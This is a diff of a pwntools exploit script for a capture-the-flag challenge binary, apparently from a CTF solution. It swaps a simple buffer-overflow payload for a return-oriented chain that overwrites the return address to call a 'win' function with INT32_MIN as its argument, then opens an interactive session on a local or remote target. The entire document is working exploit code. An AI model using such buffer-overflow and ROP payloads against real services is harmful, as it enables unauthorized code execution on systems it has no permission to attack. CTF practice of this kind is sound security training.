@@ -5,17 +5,21 @@ context.log_level = 'info'
 
 def start():
     if args.REMOTE:
-        return remote('10.21.232.223', 59440)   # your port here
+        return remote('10.21.232.223', 45335)   # replace port
     return process('./chal')
 
 p = start()
 
-magic = 0xff293a6365737963
-payload = b'A' * 312 + p64(magic)
+pop_rdi = 0x4012b5      # pop rdi; ret
+win     = 0x4011f6
+INT32_MIN = 0xffffffff80000000  # sign-extended to 64 bits
 
-p.recvuntil(b'Enter you Customer ID : ')
-p.sendline(b'0')
-p.recvuntil(b'Enter your Username : ')
+payload  = b'A' * 40
+payload += p64(pop_rdi)
+payload += p64(INT32_MIN)
+payload += p64(win)
+
+p.recvuntil(b'Hi who is it?')
 p.sendline(payload)
 
 p.interactive()
